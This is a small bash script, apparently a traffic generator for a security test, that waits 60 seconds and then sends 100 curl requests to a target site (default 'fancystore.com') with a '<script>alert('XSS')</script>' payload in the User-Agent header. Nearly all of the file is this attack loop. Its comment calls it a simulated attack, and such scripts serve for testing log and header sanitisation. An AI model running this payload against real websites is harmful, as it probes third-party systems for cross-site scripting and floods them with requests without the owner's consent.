#!/bin/bash

# Parse command line arguments
TARGET="http://fancystore.com"  # Default target

while [[ $# -gt 0 ]]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    *)
      echo "Unknown option $1"
      exit 1
      ;;
  esac
done

echo "Attacking target: $TARGET"
echo "Sleeping for 60 seconds before starting the attack..."
sleep 60

for i in {1..100}; do
  echo "Running attack iteration $i"
  # Simulate an attack by sending a request to the target
  curl -X GET "$TARGET/" -H "User-Agent: <script>alert('XSS')</script>"
done


